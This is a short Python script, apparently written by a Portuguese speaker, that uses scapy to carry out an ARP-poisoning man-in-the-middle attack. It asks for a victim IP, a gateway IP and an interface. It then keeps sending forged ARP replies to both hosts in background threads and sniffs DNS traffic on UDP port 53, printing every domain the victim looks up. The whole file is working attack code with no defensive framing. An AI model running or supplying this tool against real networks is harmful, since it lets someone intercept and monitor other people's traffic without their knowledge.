from scapy.all import *
import threading,os,sys 
print (" MIT RFS ") 
VIP = raw_input("Ip da vitima: ") 
GW = raw_input("IP do gateway: ")
IFACE = raw_input("Nome da interface[ex et0]:")
def dnshandle(pkt):
     if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
          print(VIP+" pesquisou por: "+pkt.getlayer(DNS).qd.qname) 
def v_poison():
     v = ARP(pdst=VIP,psrc = GW)
     while True:
             try:
                 send(v,verbose=0,inter=2,loop=1)
             except:
                 sys.exit(1) 
def gw_poison():
     gw = ARP(pdst=GW,psrc=VIP)
     while True:
             try:
                 send(gw,verbose=0,inter=1,loop=1)
             except:
                 sys.exit(1)
vthread = [] 
gwthread = [] 
while True:
      vpoison = threading.Thread(target=v_poison)
      vpoison.setDaemon(True)
      vthread.append(vpoison)
      vpoison.start()      
      gwpoison = threading.Thread(target=gw_poison)
      gwpoison.setDaemon(True)
      gwthread.append(gwpoison)
      gwpoison.start()
      pkt = sniff(iface=IFACE,filter='udp port 53',prn=dnshandle)
